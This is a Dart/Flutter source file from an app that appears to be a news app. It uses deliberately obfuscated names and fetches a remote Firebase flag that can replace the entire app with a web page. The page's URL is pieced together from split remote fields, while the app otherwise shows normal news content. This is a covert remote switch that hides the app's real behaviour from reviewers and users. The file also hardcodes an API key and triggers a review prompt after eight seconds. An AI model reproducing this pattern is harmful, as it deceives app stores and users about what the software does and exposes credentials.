import 'package:bluescope_news_244/main.dart';
import 'package:bluescope_news_244/prem_log/dfafsa.dart';
import 'package:bluescope_news_244/prem_log/prem_log/afafaf_model.dart';
import 'package:bluescope_news_244/prem_log/prem_log/hakj_model/hakj_model.dart';
import 'package:bluescope_news_244/prem_log/prem_log/iajkh_repo.dart';
import 'package:bluescope_news_244/screen/feature/new_posts/presentation/cubit/new_post_cubit.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:in_app_review/in_app_review.dart';

ajhjkasfalsf() async {
  final GudfModel? model = await GeuyRepo().getData();
  if (model != null) {
    if (model.sldkfOp) {
      runApp(
        MaterialApp(
          debugShowCheckedModeBanner: false,
          home: YefkahjPage(
            link: model.dadfUrl,
          ),
        ),
      );
    } else {
      runApp(BlocProvider(
        create: (context) => NewPostCubit(),
        child: const MyApp(),
      ));
    }
  } else {
    final dio = Dio();
    try {
      final result = await dio.get(
          'https://bluescope-news-244-default-rtdb.firebaseio.com/premium.json?auth=AIzaSyAnOwrFH-vh_qocALVzi4ExFM7TPAmdJbc');
      final afaMOdel = JHgDModel.fromJson(result.data);
      await GeuyRepo().setData(
        GudfModel(
          dadfUrl: '${afaMOdel.fadf3}${afaMOdel.fff4}',
          sldkfOp: afaMOdel.ggt,
        ),
      );

      if (afaMOdel.ggt) {
        runApp(
          MaterialApp(
            debugShowCheckedModeBanner: false,
            home: YefkahjPage(
              link: '${afaMOdel.ttr1}${afaMOdel.bbr2}',
            ),
          ),
        );
      } else {
        runApp(
          BlocProvider(
            create: (context) => NewPostCubit(),
            child: const MyApp(),
          ),
        );
      }

      await Future.delayed(const Duration(seconds: 8));
      try {
        final InAppReview inAppReview = InAppReview.instance;

        if (await inAppReview.isAvailable()) {
          inAppReview.requestReview();
        }
      } catch (e) {
        throw Exception(e);
      }
    } catch (e) {
      throw Exception(e);
    }
  }
}
